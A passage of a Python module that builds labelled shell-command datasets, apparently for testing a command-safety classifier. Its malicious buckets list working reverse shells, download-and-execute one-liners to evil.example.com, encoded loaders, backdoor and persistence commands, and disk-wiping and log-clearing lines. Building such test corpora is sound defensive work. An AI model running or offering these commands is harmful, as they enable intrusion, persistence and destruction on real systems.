#!/usr/bin/env python3
"""Curated Tier 1 stress-test corpora.

Provides two datasets:
  - hard negatives across Benign / Context_Dependent / Malicious boundaries
  - expanded real-world benign commands for false-positive auditing
"""

from __future__ import annotations

from itertools import product


def _unique(items: list[dict[str, str]]) -> list[dict[str, str]]:
    seen: set[tuple[str, str]] = set()
    result: list[dict[str, str]] = []
    for item in items:
        key = (item["command"], item["label"])
        if key in seen:
            continue
        seen.add(key)
        result.append(item)
    return result


def build_hard_negative_cases() -> list[dict[str, str]]:
    cases: list[dict[str, str]] = []

    simple_benign_admin = [
        "pwd",
        "uptime",
        "date",
        "whoami",
        "hostname",
        "cat /etc/hostname",
        "cat /etc/os-release",
        "systemctl status nginx",
        "journalctl -u sshd --no-pager -n 20",
        "df -h",
        "free -m",
        "ls -la /var/log",
        "ls -l /srv/releases/current",
        "find /tmp -maxdepth 2 -type f",
        "tar tzf backup.tar.gz | head -20",
        "docker ps",
        "docker images",
        "kubectl get pods -A",
        "kubectl describe service web",
        "git status",
        "git diff --stat HEAD~1",
        "python3 -m pytest tests/unit",
        "pip list | head -20",
        "npm run build",
        "make test",
        "openssl x509 -in server.crt -text -noout",
        "ssh -T git@github.com",
        "scp backup.tar ops@backup:/srv/backups/",
        "rsync -av /srv/releases/current/ audit@backup:/srv/mirror/current/",
        "curl -fsSL https://repo.example.com/pkg.deb -o /tmp/pkg.deb",
    ]
    for command in simple_benign_admin:
        cases.append({"bucket": "simple_benign_admin", "label": "Benign", "command": command})

    benign_transfer = [
        "scp backup-2026-05-29.tar.gz ops@10.0.0.8:/srv/backups/",
        "scp report.csv analyst@10.0.0.9:/srv/reports/",
        "rsync -av /var/backups/ dbadmin@10.0.0.4:/srv/db-backups/",
        "rsync -av ./dist/ deploy@10.0.0.7:/srv/releases/web/",
        "curl -fsSL https://downloads.example.com/tools/cli.tar.gz -o /tmp/cli.tar.gz",
        "curl -fsSL https://packages.example.com/app-2.1.0.deb -o /tmp/app.deb",
        "wget https://repo.example.com/releases/service.rpm -O /tmp/service.rpm",
        "aws s3 cp s3://team-backups/db.dump /srv/restore/db.dump",
        "aws s3 sync s3://team-artifacts/build-142 /srv/builds/build-142",
        "gcloud storage cp gs://ops-backups/nightly.tgz /srv/backups/nightly.tgz",
        "az storage blob download --container-name backups --name nightly.sql.gz --file /srv/backups/nightly.sql.gz",
        "docker cp web:/var/log/nginx/access.log /tmp/web-access.log",
        "kubectl cp prod/api-0:/var/log/app.log /tmp/api.log",
        "curl -I https://repo.example.com/healthz",
        "curl -fL https://releases.example.com/agent.sh -o /tmp/agent.sh",
        "rsync -av /etc/nginx/ support@10.0.0.30:/srv/cert-audit/nginx/",
        "scp /etc/ssl/certs/server.pem audit@10.0.0.40:/srv/cert-audit/server.pem",
        "scp ./coverage.xml ci@10.0.0.12:/srv/ci-artifacts/coverage.xml",
        "curl -fsSL https://files.pythonhosted.org/packages/pkg.whl -o /tmp/pkg.whl",
        "wget https://nodejs.org/dist/v20.0.0/node-v20.0.0-linux-x64.tar.xz -O /tmp/node.tar.xz",
        "aws s3 cp ./terraform.tfstate s3://infra-state/project/terraform.tfstate",
        "gcloud storage cp ./kube-audit.txt gs://team-audits/kube-audit.txt",
        "az storage blob upload --container-name release --name manifest.json --file ./manifest.json",
        "scp ~/.ssh/config audit@10.0.0.22:/srv/ssh-baselines/config.sam",
    ]
    for command in benign_transfer:
        cases.append({"bucket": "benign_transfer", "label": "Benign", "command": command})

    context_recon = [
        "whoami",
        "id",
        "groups",
        "uname -a",
        "ps aux",
        "ps aux --sort=-%cpu | head -20",
        "pgrep -af ssh",
        "ss -tulpn",
        "netstat -tulpn",
        "ip addr show",
        "ip route",
        "route -n",
        "arp -a",
        "lsblk",
        "mount | grep ext4",
        "crontab -l",
        "systemctl list-units --type=service",
        "journalctl --list-boots",
        "env | sort",
        "history | tail -50",
        "docker ps -a",
        "docker inspect web",
        "kubectl get pods -A",
        "kubectl get secrets -A",
        "kubectl describe node worker-1",
        "aws sts get-caller-identity",
        "aws ec2 describe-instances --max-items 5",
        "gcloud projects list",
        "az vm list -o table",
        "find / -perm -4000 -type f 2>/dev/null",
        "getfacl /etc/sudoers",
        "ls /root/.ssh",
        "ls -la /var/lib/kubelet",
        "stat /etc/passwd",
        "cat /proc/version",
        "dig example.com",
        "nslookup intranet.local",
        "host 10.0.0.12",
        "tcpdump -i eth0 -w /tmp/capture.pcap",
        "strace -f -o /tmp/trace.log systemctl status nginx",
    ]
    for command in context_recon:
        cases.append({"bucket": "context_recon", "label": "Context_Dependent", "command": command})

    context_sensitive_access = [
        "cat /etc/passwd",
        "cat /etc/group",
        "cat /etc/ssh/sshd_config",
        "ls -la /root/.ssh",
        "find /home -name authorized_keys",
        "find / -name id_rsa 2>/dev/null",
        "grep -R \"token\" /etc /opt/app/config 2>/dev/null | head -20",
        "tar czf /tmp/kube-audit.tgz /etc/kubernetes",
        "tar czf /tmp/pam-audit.tgz /etc/pam.d",
        "rsync -av /etc/ssh/ audit@10.0.0.22:/srv/ssh-baselines/host-a/",
        "scp /etc/passwd audit@10.0.0.30:/srv/audit/passwd.host-a",
        "scp /var/log/auth.log incident@10.0.0.21:/srv/incident/auth.log",
        "docker exec db cat /var/lib/postgresql/data/pg_hba.conf",
        "kubectl exec deploy/api -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "cat /etc/shadow",
        "unshadow /etc/passwd /etc/shadow > /tmp/crackme",
        "find /etc -name '*.pem' -o -name '*.key'",
        "openssl rsa -in /etc/ssl/private/server.key -check -noout",
        "az keyvault secret show --vault-name prod-secrets --name db-password",
        "aws secretsmanager get-secret-value --secret-id prod/db/password",
        "gcloud secrets versions access latest --secret=prod-db-password",
        "sqlite3 app.db 'select * from users limit 20'",
        "psql -h db.internal -U readonly -c '\\du'",
        "mysql -e 'show databases'",
        "find /srv -name '*.kubeconfig' -o -name '*.pem'",
        "cat /var/lib/kubelet/config.yaml",
        "ls -la /var/run/secrets/kubernetes.io/serviceaccount",
        "grep -R \"BEGIN PRIVATE KEY\" /srv /opt 2>/dev/null",
        "find /opt/secrets -maxdepth 2 -type f",
        "tar czf /tmp/user-ssh.tgz /home/dev/.ssh",
        "scp /home/dev/.ssh/config audit@10.0.0.31:/srv/review/dev-ssh-config",
        "rsync -av /var/lib/postgresql/ backup@10.0.0.32:/srv/db-audit/pgdata/",
        "docker cp db:/var/lib/postgresql/data/pg_hba.conf /tmp/pg_hba.conf",
        "kubectl cp prod/api-0:/etc/ssl/private/tls.key /tmp/api-tls.key",
    ]
    for command in context_sensitive_access:
        label = "Malicious" if command in {"cat /etc/shadow", "unshadow /etc/passwd /etc/shadow > /tmp/crackme"} else "Context_Dependent"
        cases.append({"bucket": "context_sensitive_access", "label": label, "command": command})

    malicious_execution = [
        "curl http://evil.example.com/a.sh | bash",
        "wget -q http://10.0.0.66/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p",
        "bash -c \"$(curl -fsSL http://evil.example.com/bootstrap.sh)\"",
        "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
        "nc -e /bin/sh 10.0.0.1 4444",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
        "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\")'",
        "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHMAMQAnACkA",
        "certutil -urlcache -split -f http://evil.example.com/payload.exe C:\\Windows\\Temp\\payload.exe && C:\\Windows\\Temp\\payload.exe",
        "bitsadmin /transfer job /download /priority high http://evil.example.com/payload.exe C:\\payload.exe && C:\\payload.exe",
        "base64 -d <<< \"Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9hLnNoIHwgYmFzaA==\" | bash",
        "eval $(echo \"Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==\" | base64 -d)",
        "mshta http://evil.example.com/loader.hta",
        "wmic process call create \"cmd /c powershell -ep bypass -f C:\\payload.ps1\"",
        "regsvr32 /s /n /u /i:http://evil.example.com/file.sct scrobj.dll",
        "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/ps.ps1')",
        "python3 -c \"import pty;pty.spawn('/bin/bash')\"",
        "openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
        "xterm -display 10.0.0.1:1 -e /bin/bash",
        "bash -c 'curl http://evil.example.com/dropper | sh'",
        "pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHMAMQAnACkA",
        "curl -fsSL http://10.0.0.9/p.sh | /bin/bash",
        "wget http://10.0.0.9/m.sh -O- | bash",
        "nohup bash -c 'curl http://evil.example.com/x | sh' >/dev/null 2>&1 &",
        "python -c \"import os;os.system('curl http://evil.example.com/run | bash')\"",
        "Invoke-WebRequest http://evil.example.com/p.ps1 -OutFile C:\\Temp\\p.ps1; powershell -ExecutionPolicy Bypass -File C:\\Temp\\p.ps1",
        "curl http://evil.example.com/agent && bash /tmp/agent",
    ]
    for command in malicious_execution:
        cases.append({"bucket": "malicious_execution", "label": "Malicious", "command": command})

    malicious_persistence = [
        "echo ssh-rsa AAAAB3Nza attacker >> ~/.ssh/authorized_keys",
        "cat /tmp/key.pub >> /root/.ssh/authorized_keys",
        "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
        "chmod u+s /bin/bash",
        "cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor",
        "echo '* * * * * curl http://evil.example.com/mine | bash' | crontab -",
        "schtasks /create /tn Updater /tr \"powershell -ep bypass -f C:\\payload.ps1\" /sc onlogon /ru SYSTEM",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\payload.exe /f",
        "systemctl enable malicious.service",
        "cp malicious.sh /etc/init.d/backdoor && chmod +x /etc/init.d/backdoor",
        "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        "install -m 755 payload.sh /etc/cron.daily/cleanup",
        "printf '@reboot root /tmp/.x\n' > /etc/cron.d/rootkit",
        "launchctl load ~/Library/LaunchAgents/com.apple.updater.plist",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AdobeUpdate /d C:\\Temp\\u.exe /f",
        "powershell Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Helper -Value C:\\Temp\\helper.exe",
        "sc create WinUpdate binPath= C:\\Temp\\payload.exe start= auto",
        "echo '/tmp/payload &' >> /etc/rc.local",
        "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && systemctl restart sshd",
        "crontab -l | { cat; echo '*/5 * * * * /tmp/agent'; } | crontab -",
        "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh",
        "wmic startup create Caption=Updater Command=C:\\Temp\\payload.exe",
    ]
    for command in malicious_persistence:
        cases.append({"bucket": "malicious_persistence", "label": "Malicious", "command": command})

    malicious_impact = [
        "rm -rf / --no-preserve-root",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "mkfs.ext4 /dev/sda1",
        "vssadmin delete shadows /all /quiet",
        "wbadmin delete catalog -quiet",
        "bcdedit /set {default} recoveryenabled No",
        "cipher /w:C",
        "truncate -s 0 /var/log/auth.log",
        "shred -u /var/log/syslog",
        "iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT",
        "systemctl stop auditd && systemctl disable auditd",
        "setenforce 0",
        "ufw disable",
        "pkill -9 sshd",
        "kill -9 1",
        "del /f /q C:\\Windows\\System32\\winevt\\Logs\\*.evtx",
        "wevtutil cl Security",
        "sc stop WinDefend",
        "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
        "find /var/log -type f -exec shred -u {} \\;",
    ]
    for command in malicious_impact:
        label = "Context_Dependent" if command in {"iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT"} else "Malicious"
        cases.append({"bucket": "malicious_impact", "label": label, "command": command})

    return _unique(cases)


def build_expanded_benign_commands() -> list[dict[str, str]]:
    commands: list[dict[str, str]] = []

    def add_many(category: str, values: list[str]) -> None:
        for command in values:
            commands.append({"bucket": category, "label": "Benign", "command": command})

    linux_targets = ["/var/log", "/etc/nginx", "/srv/app/current", "/home/dev/project", "/tmp", "/opt/services"]
    add_many(
        "linux_admin",
        [
            f"ls -la {target}" for target in linux_targets
        ] + [
            f"find {target} -maxdepth 2 -type f | head -20" for target in linux_targets
        ] + [
            f"du -sh {target}" for target in linux_targets
        ] + [
            f"stat {target}" for target in linux_targets
        ] + [
            f"file {target}" for target in linux_targets
        ] + [
            f"grep -R 'listen' {target} 2>/dev/null | head -20" for target in linux_targets
        ] + [
            f"find {target} -maxdepth 3 -type d | head -20" for target in linux_targets
        ] + [
            f"lsattr -R {target} 2>/dev/null | head -20" for target in linux_targets
        ] + [
            "pwd", "uptime", "date", "cal", "whoami", "hostname", "id", "groups", "uname -a",
            "df -h", "free -m", "mount", "lsblk", "blkid", "findmnt", "lscpu", "lsmem", "timedatectl",
            "systemctl status nginx", "systemctl status postgresql", "systemctl status docker",
            "journalctl -u sshd --no-pager -n 50", "journalctl -u nginx --no-pager -n 50",
            "cat /etc/hostname", "cat /etc/os-release", "cat /proc/version", "cat /proc/cpuinfo | head -20",
            "tail -n 50 /var/log/syslog", "grep -R 'ERROR' /var/log | head -20", "history | tail -20",
            "ss -tuln", "netstat -rn", "ip addr show", "ip route", "arp -a", "route -n",
        ],
    )

    docker_names = ["web", "api", "worker", "db", "redis", "nginx"]
    add_many(
        "docker",
        [
            "docker ps", "docker ps -a", "docker images", "docker volume ls", "docker network ls", "docker info",
            "docker stats --no-stream", "docker compose ps", "docker compose config", "docker compose logs --tail=50",
        ] + [
            f"docker logs {name} --tail=100" for name in docker_names
        ] + [
            f"docker inspect {name}" for name in docker_names
        ] + [
            f"docker exec {name} env | sort" for name in docker_names[:4]
        ] + [
            f"docker cp {name}:/var/log/app.log /tmp/{name}.log" for name in docker_names[:4]
        ] + [
            f"docker exec {name} sh -lc 'ls -la /app || ls -la /srv || pwd'" for name in docker_names
        ] + [
            f"docker port {name}" for name in docker_names
        ] + [
            f"docker top {name}" for name in docker_names
        ] + [
            f"docker diff {name}" for name in docker_names[:4]
        ],
    )

    kube_ns = ["default", "prod", "staging", "ops"]
    add_many(
        "kubernetes",
        [
            "kubectl version --client", "kubectl cluster-info", "kubectl get nodes", "kubectl top nodes",
            "kubectl get namespaces", "kubectl get events -A --sort-by=.metadata.creationTimestamp | tail -50",
        ] + [
            f"kubectl get pods -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl get svc -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl describe deploy api -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl logs deploy/api -n {ns} --tail=100" for ns in kube_ns
        ] + [
            f"kubectl top pods -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl get ingress -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl get configmap -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl rollout status deploy/api -n {ns}" for ns in kube_ns
        ] + [
            f"kubectl get hpa -n {ns}" for ns in kube_ns
        ],
    )

    ci_jobs = ["build", "test", "lint", "package", "release", "deploy"]
    add_many(
        "cicd",
        [
            "git status", "git log --oneline -10", "git diff --stat HEAD~1", "git branch -a", "git remote -v",
            "npm ci", "npm run build", "npm run test", "yarn install --frozen-lockfile", "pnpm install --frozen-lockfile",
            "pip install -r requirements.txt", "pip freeze > requirements.lock", "poetry install", "poetry run pytest tests/unit",
            "make clean && make test", "cmake -S . -B build && cmake --build build", "go test ./...", "cargo test",
            "mvn -q test", "gradle test", "terraform plan -out=tfplan", "ansible-playbook site.yml --check",
        ] + [
            f"gh run list --workflow {job}.yml --limit 5" for job in ci_jobs
        ] + [
            f"grep -R '{job.upper()}' .github/workflows | head -20" for job in ci_jobs
        ] + [
            f"find . -path '*{job}*' | head -20" for job in ci_jobs
        ] + [
            f"sed -n '1,80p' .github/workflows/{job}.yml 2>/dev/null" for job in ci_jobs
        ],
    )

    add_many(
        "package_managers",
        [
            "apt list --installed | head -50", "apt-cache policy nginx", "apt-get update", "apt-get download nginx",
            "dpkg -l | grep python", "rpm -qa | head -50", "yum list installed | head -50", "dnf list installed | head -50",
            "pip list | head -50", "pip show flask", "pip cache dir", "npm list --depth=0", "npm audit --omit=dev",
            "yarn list --depth=0", "brew list | head -50", "brew info openssl", "conda env list", "conda list",
            "gem list | head -50", "cargo install --list | head -50",
            "apt-cache search postgresql | head -20", "pip index versions requests | head -20", "npm view react version",
            "yarn info react version", "brew outdated", "conda info", "gem env", "cargo search serde | head -20",
        ],
    )

    log_sources = ["/var/log/syslog", "/var/log/auth.log", "/var/log/nginx/access.log", "/var/log/nginx/error.log", "/var/log/kern.log"]
    add_many(
        "logs",
        [
            f"tail -n 100 {path}" for path in log_sources
        ] + [
            f"head -n 50 {path}" for path in log_sources
        ] + [
            f"grep -i error {path} | tail -20" for path in log_sources
        ] + [
            f"awk 'NR<=20 {{print}}' {path}" for path in log_sources
        ] + [
            "journalctl -u docker --since today | tail -100",
            "journalctl -u kubelet --since today | tail -100",
            "docker logs api --tail=200",
            "kubectl logs deploy/api -n prod --tail=200",
            "grep -R 'timeout' /var/log/nginx 2>/dev/null | tail -20",
            "grep -R 'panic' /var/log 2>/dev/null | head -20",
            "sed -n '1,80p' /var/log/cloud-init.log 2>/dev/null",
            "awk 'NR>1 && NR<50 {print}' /var/log/dpkg.log 2>/dev/null",
        ],
    )

    backup_sources = ["/srv/data", "/var/backups", "/etc/nginx", "/home/dev/project", "/opt/config"]
    add_many(
        "backups_and_transfer",
        [
            f"tar -czf /tmp/{index}.tgz {src}" for index, src in enumerate(backup_sources, start=1)
        ] + [
            f"rsync -av {src}/ backup@10.0.0.{20 + index}:/srv/backup/{index}/" for index, src in enumerate(backup_sources, start=1)
        ] + [
            f"scp {src.rstrip('/').replace('/', '_')}.tgz ops@10.0.0.{30 + index}:/srv/uploads/" for index, src in enumerate(backup_sources, start=1)
        ] + [
            "ssh ops@10.0.0.40 'hostname && uptime'",
            "ssh backup@10.0.0.41 'ls -la /srv/backups'",
            "aws s3 sync /srv/data s3://team-backups/data --dryrun",
            "gcloud storage rsync /srv/data gs://team-backups/data --recursive --dry-run",
            "az storage blob upload-batch --destination backups --source /srv/data --dryrun",
            "restic snapshots --repo /srv/restic-repo",
            "borg list /srv/borg-repo",
            "rclone lsf remote:team-backups",
            "tar -tvf /srv/backups/nightly.tar | head -30",
        ],
    )

    add_many(
        "database_admin",
        [
            "psql -h db.internal -U readonly -c '\\l'",
            "psql -h db.internal -U readonly -c '\\du'",
            "psql -h db.internal -U readonly -c 'select now()'",
            "psql -h db.internal -U readonly -c '\\dt'",
            "psql -h db.internal -U readonly -c 'select current_database()'",
            "mysql -h db.internal -e 'show databases'",
            "mysql -h db.internal -e 'show processlist'",
            "mysql -h db.internal -e 'status'",
            "redis-cli info | head -40",
            "redis-cli slowlog get 10",
            "redis-cli dbsize",
            "mongosh --eval 'db.adminCommand({ listDatabases: 1 })'",
            "mongosh --eval 'db.serverStatus().connections'",
            "sqlite3 app.db '.tables'",
            "sqlite3 app.db 'select count(*) from users'",
            "sqlite3 app.db 'pragma integrity_check'",
            "pg_dump -s -h db.internal -U readonly appdb > /tmp/appdb_schema.sql",
            "mysqldump --no-data appdb > /tmp/appdb_schema.sql",
        ],
    )

    add_many(
        "cloud_cli",
        [
            "aws sts get-caller-identity", "aws s3 ls", "aws ec2 describe-instances --max-items 5",
            "aws eks list-clusters", "aws iam list-roles --max-items 20",
            "aws lambda list-functions --max-items 20", "aws rds describe-db-instances --max-items 10",
            "gcloud auth list", "gcloud projects list", "gcloud compute instances list --limit=10",
            "gcloud container clusters list", "gcloud sql instances list",
            "gcloud functions list --limit=20", "gcloud iam service-accounts list --limit=20",
            "az account show", "az vm list -o table", "az aks list -o table", "az storage account list -o table",
            "az functionapp list -o table", "az sql server list -o table",
            "doctl compute droplet list", "doctl kubernetes cluster list",
        ],
    )

    add_many(
        "developer_workflows",
        [
            "python3 -m venv .venv", "python3 -m pytest tests/unit", "python3 -m http.server 8000",
            "python3 -c 'print(\"hello world\")'", "node server.js", "npm run dev", "vite build", "next build",
            "eslint src --ext .ts,.tsx", "prettier --check .", "ruff check .", "mypy src", "tox -e py312",
            "go vet ./...", "go list ./...", "cargo fmt --check", "cargo clippy", "java -jar app.jar --help",
            "gradle build", "mvn package -DskipTests", "helm template api chart/api", "helm lint chart/api",
            "pytest -q tests/integration", "python manage.py test", "python manage.py migrate --plan",
            "npm run lint", "npm run typecheck", "pnpm test", "pnpm lint", "uv pip compile pyproject.toml -o requirements.txt",
            "go test ./... -run TestHealth", "cargo test -- --nocapture", "gradle test --info", "mvn test -q",
            "helm upgrade --install api chart/api --dry-run --debug", "docker build -t app:test .", "docker compose build",
        ],
    )

    service_names = ["nginx", "docker", "sshd", "postgresql", "redis", "kubelet"]
    add_many(
        "linux_service_matrix",
        [
            f"systemctl status {name}" for name in service_names
        ] + [
            f"journalctl -u {name} --since today | tail -50" for name in service_names
        ] + [
            f"systemctl show {name} --property=SubState,ActiveState" for name in service_names
        ] + [
            f"systemctl cat {name} | head -40" for name in service_names
        ],
    )

    network_targets = ["example.com", "github.com", "pypi.org", "registry.npmjs.org", "8.8.8.8", "1.1.1.1"]
    add_many(
        "networking_benign",
        [
            f"ping -c 2 {target}" for target in network_targets
        ] + [
            f"curl -I https://{target}" for target in network_targets[:4]
        ] + [
            f"dig {target}" for target in network_targets[:4]
        ] + [
            f"traceroute {target}" for target in network_targets[-2:]
        ] + [
            f"openssl s_client -connect {target}:443 -brief </dev/null" for target in network_targets[:4]
        ] + [
            f"nslookup {target}" for target in network_targets[:4]
        ] + [
            f"host {target}" for target in network_targets[:4]
        ] + [
            f"curl -fsSL https://{target}/robots.txt -o /tmp/{target.replace('.', '_')}.robots 2>/dev/null" for target in network_targets[:4]
        ],
    )

    config_paths = ["/etc/nginx/nginx.conf", "/etc/ssh/sshd_config", "/etc/fstab", "/etc/hosts", "/etc/resolv.conf", "/etc/crontab"]
    add_many(
        "config_review",
        [
            f"sed -n '1,80p' {path}" for path in config_paths
        ] + [
            f"grep -n '^[^#]' {path} | head -20" for path in config_paths
        ] + [
            f"stat {path}" for path in config_paths
        ] + [
            f"sha256sum {path}" for path in config_paths
        ],
    )

    matrix_paths = ["/srv/app", "/srv/api", "/srv/worker", "/opt/tools", "/var/tmp", "/home/dev"]
    add_many(
        "filesystem_matrix",
        [
            f"find {path} -maxdepth 2 -type f | wc -l" for path in matrix_paths
        ] + [
            f"find {path} -maxdepth 2 -type d | head -20" for path in matrix_paths
        ] + [
            f"ls -lh {path}" for path in matrix_paths
        ] + [
            f"du -sh {path}" for path in matrix_paths
        ] + [
            f"tree -L 2 {path} 2>/dev/null | head -40" for path in matrix_paths
        ] + [
            f"stat {path}" for path in matrix_paths
        ] + [
            f"find {path} -maxdepth 1 -mindepth 1 -printf '%f\n' | head -20" for path in matrix_paths
        ],
    )

    return _unique(commands)


def build_tier1_sanity_buckets() -> dict[str, list[dict[str, str]]]:
    buckets: dict[str, list[dict[str, str]]] = {}
    target_size = 100

    def add_bucket(name: str, label: str, commands: list[str]) -> None:
        unique_commands = list(dict.fromkeys(commands))
        if len(unique_commands) < target_size:
            raise ValueError(f"{name} expected at least {target_size} commands, found {len(unique_commands)}")
        buckets[name] = [
            {"bucket": name, "label": label, "command": command}
            for command in unique_commands[:target_size]
        ]

    trivial_benign = [
        "pwd", "cal", "date", "uptime", "hostname", "whoami", "id", "groups", "ls", "ls -a",
        "ls -l", "ls -lah", "echo hello", "printf 'ok\n'", "true", "false", "pwd -P", "tty", "umask",
        "uname -a", "uname -r", "arch", "env | head -20", "printenv HOME", "printenv PATH", "which bash",
        "which python3", "which git", "type ls", "alias", "history | tail -10", "head -n 5 /etc/hostname",
        "cat /etc/hostname", "cat /etc/os-release", "cat /proc/version", "cat /proc/uptime", "cat /proc/meminfo | head -10",
        "cat /proc/cpuinfo | head -10", "head -n 5 /etc/hosts", "wc -l /etc/hosts", "stat /tmp", "stat /var/log",
        "file /bin/ls", "file /etc/hostname", "df -h", "df -h /", "free -m", "free -h", "lsblk", "blkid",
        "findmnt", "mount", "lscpu", "lsmem", "timedatectl", "nproc", "ulimit -a", "ps -ef | head -10",
        "ps aux | head -10", "top -bn1 | head -5", "du -sh /tmp", "du -sh /var/log", "find /tmp -maxdepth 1 -type f | head -10",
        "find /var/log -maxdepth 1 -type f | head -10", "find /etc -maxdepth 1 -type f | head -10", "ls -la /tmp",
        "ls -la /var/log", "ls -la /etc", "ls -la /home", "ls -la /usr/bin | head -20", "head -n 20 README.md",
        "tail -n 20 /var/log/syslog", "grep -n root /etc/passwd | head -5", "grep -n localhost /etc/hosts", "sort /etc/shells",
        "uniq /etc/shells", "cut -d: -f1 /etc/passwd | head -10", "sed -n '1,10p' /etc/passwd", "awk 'NR<=10 {print}' /etc/passwd",
        "md5sum /etc/hostname", "sha256sum /etc/hostname", "basename /etc/hostname", "dirname /etc/hostname", "realpath /tmp",
        "readlink -f /bin/sh", "ip addr show", "ip route", "ss -tuln", "netstat -rn", "ping -c 1 8.8.8.8",
        "dig example.com", "nslookup example.com", "host example.com", "curl -I https://example.com", "wget -qO- https://example.com | head -5",
        "ls -1 /usr/bin | head -20", "find /usr/bin -maxdepth 1 -type f | head -20", "du -sh /usr/bin", "stat /etc/hosts", "wc -c /etc/hostname",
    ]

    routine_admin = [
        "systemctl status nginx", "systemctl status docker", "systemctl status sshd", "systemctl status postgresql", "systemctl list-units --type=service | head -20",
        "journalctl -u sshd --no-pager -n 50", "journalctl -u nginx --no-pager -n 50", "journalctl -u docker --no-pager -n 50", "journalctl --since today | tail -50",
        "docker ps", "docker ps -a", "docker images", "docker volume ls", "docker network ls", "docker info", "docker stats --no-stream",
        "docker logs api --tail=100", "docker logs nginx --tail=100", "docker inspect api", "docker inspect db", "docker top api", "docker top db",
        "docker port nginx", "docker exec api env | sort", "docker exec db sh -lc 'pwd && ls -la /var/lib/postgresql'", "docker cp api:/var/log/app.log /tmp/api.log",
        "kubectl get pods", "kubectl get pods -n default", "kubectl get pods -n prod", "kubectl get svc -n default", "kubectl get namespaces",
        "kubectl cluster-info", "kubectl get nodes", "kubectl top nodes", "kubectl top pods -n prod", "kubectl describe deploy api -n prod",
        "kubectl logs deploy/api -n prod --tail=100", "kubectl get configmap -n prod", "kubectl get ingress -n prod", "kubectl rollout status deploy/api -n prod",
        "stat /etc/nginx", "stat /etc/ssh/sshd_config", "stat /srv/app/current", "find /var/log -maxdepth 2 -type f", "find /etc/nginx -maxdepth 2 -type f",
        "find /srv/app/current -maxdepth 2 -type f", "grep -R 'listen' /etc/nginx 2>/dev/null | head -20", "grep -R 'server_name' /etc/nginx 2>/dev/null | head -20",
        "tail -n 50 /var/log/auth.log", "tail -n 50 /var/log/nginx/access.log", "tail -n 50 /var/log/nginx/error.log", "grep -R 'ERROR' /var/log | head -20",
        "find /var/log -maxdepth 3 -type d | head -20", "lsattr -R /var/log 2>/dev/null | head -20", "du -sh /etc/nginx", "du -sh /srv/app/current",
        "file /etc/nginx", "file /srv/app/current", "openssl x509 -in server.crt -text -noout", "openssl s_client -connect internal-api.company.local:443 -servername internal-api.company.local </dev/null",
        "git status", "git log --oneline -10", "git diff --stat HEAD~1", "npm run build", "python3 -m pytest tests/unit", "make test", "pip list | head -20",
        "apt list --installed | head -50", "apt-cache policy nginx", "yum list installed | head -20", "dnf list installed | head -20", "brew list | head -20",
        "aws sts get-caller-identity", "aws s3 ls", "gcloud projects list", "az account show", "terraform plan -out=tfplan",
        "psql -h db.internal -U readonly -c '\\l'", "mysql -h db.internal -e 'show databases'", "redis-cli info | head -40", "sqlite3 app.db '.tables'",
        "tar -czf /tmp/config-backup.tgz /etc/nginx", "rsync -av /srv/app/current/ backup@10.0.0.20:/srv/backups/app/", "scp /etc/nginx/nginx.conf audit@10.0.0.30:/srv/audit/nginx.conf",
        "ssh ops@10.0.0.40 'hostname && uptime'", "crontab -l", "passwd -S root", "id deploy", "groups deploy", "last | head -20",
